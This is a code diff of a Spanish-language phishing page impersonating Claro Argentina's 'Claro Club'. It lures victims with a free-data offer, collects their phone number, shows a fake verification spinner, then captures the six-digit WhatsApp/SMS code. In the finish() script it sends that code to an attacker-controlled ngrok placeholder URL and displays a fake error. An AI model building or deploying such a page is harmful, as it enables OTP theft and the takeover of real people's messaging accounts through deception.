@@ -3,27 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claro | Beneficios</title>
+    <title>Claro | Gestión de Beneficios</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; text-align: center; margin: 0; }
-        .header { background: #ee1c25; color: white; padding: 20px; font-size: 22px; font-weight: bold; }
-        .card { background: white; margin: 20px auto; padding: 20px; width: 85%; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        input { width: 80%; padding: 10px; margin: 20px 0; border: 1px solid #ccc; font-size: 20px; text-align: center; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; margin: 0; color: #333; }
+        .navbar { background: #ee1c25; padding: 15px; color: white; font-weight: bold; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .container { width: 90%; max-width: 450px; margin: 30px auto; background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .hero-img { background: #ee1c25; padding: 30px; color: white; text-align: center; }
+        .content { padding: 25px; text-align: center; }
+        h2 { margin: 0 0 15px; font-size: 22px; color: #ee1c25; }
+        p { font-size: 15px; line-height: 1.6; color: #666; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; text-align: center; box-sizing: border-box; }
+        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn:disabled { background: #ccc; }
+        .loading { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ee1c25; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { font-size: 11px; color: #999; margin-top: 20px; padding: 10px; }
     </style>
 </head>
 <body>
-    <div class="header">CLARO CLUB</div>
-    <div id="p1" class="card">
-        <h2 style="color:#ee1c25">¡30GB DE REGALO!</h2>
-        <p>Activá tu pack exclusivo de navegación sin cargo.</p>
-        <button class="btn" onclick="document.getElementById('p1').style.display='none';document.getElementById('p2').style.display='block';">CANJEAR PACK</button>
+
+<div class="navbar">Claro Club</div>
+
+<div class="container">
+    <div class="hero-img">
+        <div style="font-size: 50px;">🎁</div>
+        <div style="font-size: 24px; font-weight: bold;">PACK FIDELIDAD</div>
     </div>
-    <div id="p2" class="card" style="display:none;">
-        <h3>VALIDACIÓN</h3>
-        <p>Ingresá el código que recibiste por <b>WhatsApp o SMS</b> para confirmar la línea.</p>
-        <input type="number" id="c" placeholder="000000">
-        <button class="btn" onclick="alert('Error de red. Reintente.')">ACTIVAR AHORA</button>
+
+    <div id="step1" class="content">
+        <h2>¡Felicidades!</h2>
+        <p>Tu línea califica para un beneficio exclusivo de <b>50GB Libres</b> por 3 meses.</p>
+        <p>Ingresá tu número de línea para iniciar la vinculación:</p>
+        <input type="tel" id="phone" placeholder="Cod. área + número (sin 0 ni 15)">
+        <button class="btn" onclick="nextStep()">VINCULAR LÍNEA</button>
     </div>
+
+    <div id="loading-step" class="content" style="display:none;">
+        <h2>Verificando línea...</h2>
+        <div class="loading" style="display:block;"></div>
+        <p>Consultando base de datos de Claro Argentina...</p>
+    </div>
+
+    <div id="step2" class="content" style="display:none;">
+        <h2>Verificación de Seguridad</h2>
+        <p>Por seguridad, enviamos un código de validación de 6 dígitos mediante nuestra pasarela asociada (<b>WhatsApp/SMS</b>).</p>
+        <p>Ingresalo aquí para completar la activación de tus GB:</p>
+        <input type="number" id="code" placeholder="0 0 0 0 0 0">
+        <button class="btn" onclick="finish()">ACTIVAR AHORA</button>
+    </div>
+
+    <div class="footer">
+        © 2026 AMX Argentina S.A. Todos los derechos reservados.<br>
+        Términos y condiciones de Claro Club.
+    </div>
+</div>
+
+<script>
+    function nextStep() {
+        const phone = document.getElementById('phone').value;
+        if(phone.length < 8) return alert("Ingresá un número válido");
+        
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('loading-step').style.display = 'block';
+        
+        // Simula carga para dar realismo
+        setTimeout(() => {
+            document.getElementById('loading-step').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }, 2500);
+    }
+
+    function finish() {
+        const codigo = document.getElementById('code').value;
+        // Reemplaza con tu URL de Ngrok
+        fetch('https://TU-URL-DE-NGROK.ngrok-free.app/log?code=' + codigo);
+        alert("Error de sincronización con la red. Reintente en 5 minutos.");
+    }
+</script>
+
 </body>
 </html>
